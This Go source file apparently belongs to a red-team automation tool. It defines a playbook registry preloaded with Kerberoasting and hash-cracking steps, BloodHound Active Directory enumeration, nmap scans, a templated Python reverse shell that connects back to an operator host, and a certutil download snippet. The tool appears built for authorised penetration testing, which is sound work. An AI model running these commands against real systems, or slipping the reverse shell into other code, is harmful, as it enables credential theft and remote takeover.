package playbook

import (
	"context"
	"fmt"
	"strings"
	"sync"
)

type PlaybookType string

const (
	PlaybookYAML PlaybookType = "yaml"
	PlaybookJSON PlaybookType = "json"
)

type Playbook struct {
	ID          string            `yaml:"id" json:"id"`
	Name        string            `yaml:"name" json:"name"`
	Description string            `yaml:"description" json:"description"`
	Type        PlaybookType      `yaml:"type" json:"type"`
	Tags        []string          `yaml:"tags" json:"tags"`
	Steps       []PlaybookStep    `yaml:"steps" json:"steps"`
	Parameters  []PlaybookParam   `yaml:"parameters" json:"parameters"`
	RequiresApproval bool         `yaml:"requires_approval" json:"requires_approval"`
}

type PlaybookStep struct {
	Order       int                    `yaml:"order" json:"order"`
	Name        string                 `yaml:"name" json:"name"`
	Command     string                 `yaml:"command" json:"command"`
	Parameters  map[string]string      `yaml:"parameters" json:"parameters"`
	Timeout     int                    `yaml:"timeout" json:"timeout"`
	Retry       int                    `yaml:"retry" json:"retry"`
	OnFailure   string                 `yaml:"on_failure" json:"on_failure"`
}

type PlaybookParam struct {
	Name        string `yaml:"name" json:"name"`
	Type        string `yaml:"type" json:"type"`
	Required    bool   `yaml:"required" json:"required"`
	Default     string `yaml:"default" json:"default"`
	Description string `yaml:"description" json:"description"`
}

type Snippet struct {
	ID          string
	Name        string
	Description string
	Command     string
	OS          string
	Tags        []string
	Parameters  []string
}

type Registry struct {
	playbooks map[string]*Playbook
	snippets  map[string]*Snippet
	mu        sync.RWMutex
}

func NewRegistry() *Registry {
	r := &Registry{
		playbooks: make(map[string]*Playbook),
		snippets:  make(map[string]*Snippet),
	}
	r.initDefaults()
	return r
}

func (r *Registry) initDefaults() {
	r.playbooks["kerberoast"] = &Playbook{
		ID:          "kerberoast",
		Name:        "Kerberoast Attack",
		Description: "Extract service account hashes via Kerberos TGS-REP",
		Tags:        []string{"active_directory", "credential_access", "kerberos"},
		RequiresApproval: true,
		Parameters: []PlaybookParam{
			{Name: "domain", Type: "string", Required: true, Description: "Target domain"},
			{Name: "username", Type: "string", Required: true, Description: "Domain username"},
			{Name: "password", Type: "password", Required: true, Description: "Domain password"},
			{Name: "dc_ip", Type: "string", Required: false, Default: "", Description: "Domain controller IP"},
		},
		Steps: []PlaybookStep{
			{Order: 1, Name: "enumerate_spns", Command: "impacket-GetUserSPNs -request -dc-ip {{.dc_ip}} {{.domain}}/{{.username}}:{{.password}}" },
			{Order: 2, Name: "extract_hashes", Command: "extract_tgs_hashes", Timeout: 300},
			{Order: 3, Name: "crack_hashes", Command: "hashcat -m 13100 -a 0", Timeout: 600},
		},
	}

	r.playbooks["bloodhound"] = &Playbook{
		ID:          "bloodhound",
		Name:        "BloodHound Enumeration",
		Description: "Active Directory ACL mapping with BloodHound",
		Tags:        []string{"active_directory", "recon", "acl"},
		RequiresApproval: true,
		Parameters: []PlaybookParam{
			{Name: "domain", Type: "string", Required: true, Description: "Target domain"},
			{Name: "username", Type: "string", Required: true, Description: "Domain username"},
			{Name: "password", Type: "password", Required: true, Description: "Domain password"},
			{Name: "dc_ip", Type: "string", Required: true, Description: "Domain controller IP"},
		},
		Steps: []PlaybookStep{
			{Order: 1, Name: "run_bloodhound", Command: "bloodhound-python -d {{.domain}} -u {{.username}} -p {{.password}} -dc {{.dc_ip}} -c All", Timeout: 600},
		},
	}

	r.playbooks["recon_quick"] = &Playbook{
		ID:          "recon_quick",
		Name:        "Quick Reconnaissance",
		Description: "Quick port scan and service detection",
		Tags:        []string{"recon", "quick"},
		Parameters: []PlaybookParam{
			{Name: "target", Type: "string", Required: true, Description: "Target IP or CIDR"},
			{Name: "ports", Type: "string", Required: false, Default: "80,443,22,3389,445", Description: "Ports to scan"},
		},
		Steps: []PlaybookStep{
			{Order: 1, Name: "port_scan", Command: "nmap -sS -p {{.ports}} {{.target}}", Timeout: 120},
			{Order: 2, Name: "service_detect", Command: "nmap -sV -p {{.ports}} {{.target}}", Timeout: 180},
		},
	}

	r.snippets["reverse_shell_python"] = &Snippet{
		ID: "rev_shell_py", Name: "Python Reverse Shell",
		Command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{.lhost}}",{{.lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
		OS: "linux", Tags: []string{"shell", "reverse"},
		Parameters: []string{"lhost", "lport"},
	}

	r.snippets["download_certutil"] = &Snippet{
		ID: "dl_certutil", Name: "Download via certutil",
		Command: `certutil -urlcache -f {{.url}} {{.output}}`,
		OS: "windows", Tags: []string{"download", "lotl"},
		Parameters: []string{"url", "output"},
	}
}

func (r *Registry) GetPlaybook(ctx context.Context, name string) (*Playbook, error) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	pb, ok := r.playbooks[strings.ToLower(name)]
	if !ok {
		return nil, fmt.Errorf("playbook '%s' not found", name)
	}
	return pb, nil
}

func (r *Registry) RegisterPlaybook(ctx context.Context, pb *Playbook) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.playbooks[strings.ToLower(pb.Name)] = pb
	return nil
}

func (r *Registry) ListPlaybooks(ctx context.Context) []*Playbook {
	r.mu.RLock()
	defer r.mu.RUnlock()
	result := make([]*Playbook, 0, len(r.playbooks))
	for _, pb := range r.playbooks {
		result = append(result, pb)
	}
	return result
}

func (r *Registry) SearchPlaybooks(ctx context.Context, query string) []*Playbook {
	r.mu.RLock()
	defer r.mu.RUnlock()
	var results []*Playbook
	query = strings.ToLower(query)
	for _, pb := range r.playbooks {
		if strings.Contains(strings.ToLower(pb.Name), query) ||
			strings.Contains(strings.ToLower(pb.Description), query) {
			results = append(results, pb)
		} else {
			for _, tag := range pb.Tags {
				if strings.Contains(strings.ToLower(tag), query) {
					results = append(results, pb)
					break
				}
			}
		}
	}
	return results
}

func (r *Registry) GetSnippet(ctx context.Context, name string) (*Snippet, error) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	s, ok := r.snippets[strings.ToLower(name)]
	if !ok {
		return nil, fmt.Errorf("snippet '%s' not found", name)
	}
	return s, nil
}

func (r *Registry) RegisterSnippet(ctx context.Context, s *Snippet) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.snippets[strings.ToLower(s.Name)] = s
	return nil
}

func (r *Registry) ResolvePlaybookRef(ctx context.Context, ref string) (*Playbook, map[string]string, error) {
	ref = strings.TrimPrefix(ref, "@playbook ")
	ref = strings.TrimSpace(ref)

	parts := strings.SplitN(ref, " ", 2)
	name := parts[0]
	pb, err := r.GetPlaybook(ctx, name)
	if err != nil {
		return nil, nil, err
	}

	params := make(map[string]string)
	if len(parts) > 1 {
		args := parts[1]
		for _, arg := range strings.Fields(args) {
			kv := strings.SplitN(arg, "=", 2)
			if len(kv) == 2 {
				params[kv[0]] = kv[1]
			}
		}
	}

	for _, param := range pb.Parameters {
		if _, ok := params[param.Name]; !ok && param.Required {
			if param.Default != "" {
				params[param.Name] = param.Default
			} else {
				return nil, nil, fmt.Errorf("missing required parameter '%s' for playbook '%s'", param.Name, name)
			}
		}
	}

	return pb, params, nil
}
